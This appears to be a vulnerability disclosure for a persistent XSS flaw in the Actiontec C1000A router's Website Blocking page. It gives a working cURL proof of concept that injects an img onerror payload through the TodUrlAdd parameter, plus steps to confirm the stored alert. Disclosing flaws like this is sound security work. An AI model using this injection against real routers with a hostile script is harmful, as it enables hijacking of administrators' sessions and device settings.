# Persistent XSS in the Actiontec C1000A Website Blocking page
**Vendor**: Actiontec

**Product**: C1000A

**Firmware Version**: CAC004-31.30L.95


## Verification:
1. Make an HTTP request to the router where 192.168.0.1 is the router's local IP address, for example with this cURL POC:
```
curl "http://192.168.0.1/urlfilter.cmd?action=set_url&TodUrlAdd=<img+src=x+onerror=\"alert(String.fromCharCode(88,83,83))\"/>&Lan_IP=192.168.0.2&listtype=Exclude" -X POST
```
(The HTML payload is passed in the `TodUrlAdd` parameter. Even though this is a POST request, parameters are still passed in the URL.)

2. Open up the page Advanced Setup -> Website Blocking (/advancedsetup_websiteblocking.html) to verify that the XSS is there. It should show an alert box with the text "XSS".
